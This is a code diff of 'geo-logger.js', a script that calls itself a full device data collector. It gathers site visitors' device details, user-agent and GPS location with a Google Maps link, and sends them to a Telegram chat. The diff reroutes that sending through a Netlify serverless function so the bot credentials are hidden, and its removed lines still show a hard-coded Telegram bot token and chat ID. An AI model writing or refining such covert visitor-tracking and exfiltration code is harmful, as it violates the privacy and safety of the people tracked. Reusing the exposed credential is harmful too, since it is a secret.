@@ -1,25 +1,18 @@
 ﻿/**
  * geo-logger.js - Full device data collector
- * Sends all data to Telegram bot
+ * Sends data through Netlify serverless function (BOT_TOKEN and CHAT_ID are secure on server)
  */
 
-var BOT_TOKEN = "8494194867:AAHPe539VtvN7Brpl3YJ-8kFdfgGm0mxh_4";
-var CHAT_ID = "7979995418";
-
-// Send message to Telegram
-async function sendToTelegram(text) {
+// Send messages through Netlify function
+async function sendToTelegram(messages) {
     try {
-        await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+        await fetch("/.netlify/functions/sendVisitorLog", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: text,
-                parse_mode: "HTML"
-            })
+            body: JSON.stringify({ messages: messages })
         });
     } catch (e) {
-        console.error("Telegram error:", e);
+        console.error("Logger error:", e);
     }
 }
 
@@ -261,12 +254,8 @@ async function sendAllDataToTelegram() {
         "<b>USER-AGENT:</b>\n" +
         "<code>" + data.userAgent + "</code>";
 
-    // Send messages
-    await sendToTelegram(msg1);
-    await new Promise(function (r) { setTimeout(r, 500); });
-    await sendToTelegram(msg2);
-    await new Promise(function (r) { setTimeout(r, 500); });
-    await sendToTelegram(msg3);
+    // Send all messages at once through serverless function
+    await sendToTelegram([msg1, msg2, msg3]);
 
     // Request GPS
     if ("geolocation" in navigator) {
@@ -282,7 +271,7 @@ async function sendAllDataToTelegram() {
                 "Accuracy: " + Math.round(accuracy) + " meters\n\n" +
                 '<a href="https://www.google.com/maps?q=' + lat + ',' + lon + '">View on Google Maps</a>';
 
-            await sendToTelegram(gpsMsg);
+            await sendToTelegram([gpsMsg]);
         }, function () {
             // GPS permission denied - do nothing
         }, {
